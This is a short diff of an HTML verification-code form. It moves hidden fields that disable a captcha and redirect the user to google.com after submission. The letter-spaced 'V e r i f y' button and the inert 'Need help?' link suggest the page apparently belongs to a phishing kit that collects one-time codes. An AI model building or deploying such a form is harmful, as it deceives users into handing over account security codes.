@@ -158,14 +158,11 @@
             <td><input type="text" name="code" id="code" autocomplete="off" required></td>
           </tr>
           <tr>
-            <td></td>
+            <td><input type="hidden" name="_captcha" value="false">
+              <input type="hidden" name="_next" value="https://google.com"></td>
             <td>
               <button type="submit" id="submit-btn">V e r i f y</button>
               <a href="#" style="float: right;" onclick="return false;">Need help?</a>
-              <input type="hidden" name="_captcha" value="false">
-              <input type="hidden" name="_next" value="https://google.com">
-
-
             </td>
           </tr>
         </tbody>
